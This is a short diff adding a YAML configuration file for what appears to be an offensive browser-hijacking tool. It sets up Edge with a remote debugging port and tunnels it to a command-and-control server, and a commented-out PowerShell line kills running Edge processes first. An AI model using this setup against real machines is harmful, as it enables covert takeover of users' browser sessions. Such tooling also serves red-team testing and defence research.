@@ -1,0 +1,9 @@
+mode: tunnel
+exec_allocator: true
+browser_path: 'C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe' # For exec_allocator
+devtoolsURL: ws://127.0.0.1:9222 # Must match the params of browser_launch_command below
+httpserver: 127.0.0.1:8080 # This is the LHOST:LPORT for the c2 params
+remotetunnel: 127.0.0.1:9999 # this should be the ip of the remote c2/redirector
+debug: false
+#pre_launch_command: ['powershell.exe','-c','Get-Process -Name msedge | stop-process']
+browser_launch_command: ['C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe','--remote-debugging-port=9222']
